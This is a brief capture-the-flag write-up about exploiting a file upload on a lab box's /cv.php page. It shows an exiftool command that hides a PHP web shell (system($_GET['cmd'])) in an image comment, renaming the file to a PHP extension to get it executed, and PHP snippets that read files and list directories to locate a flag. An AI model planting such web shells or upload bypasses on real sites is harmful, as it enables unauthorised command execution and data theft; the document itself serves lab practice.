# Bypass Disable Functions

this box has a site with a file upload, on the /cv.php


small.jpg
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' test.jpeg

upload with burp as test.jpg

repeat but change name too .phpe
mv small.jpg small.php

uploaded it and can run simple php 
so trying some php stuff

```php
echo file_get_contents('../index.php')
?>```


```php
<?php
function listFilesInParentDir($dir) {
    $directoryIterator = new DirectoryIterator($dir);
    foreach ($directoryIterator as $file) {
        // if ($file->isFile()) {
            echo $file->getFilename() . PHP_EOL;
        // }
    }
}
$parentDir = realpath(__DIR__ . '/../');
listFilesInParentDir($parentDir);
?>
```

iterating these folders we found the path `/../../../../../../../../home/user/flag.txt`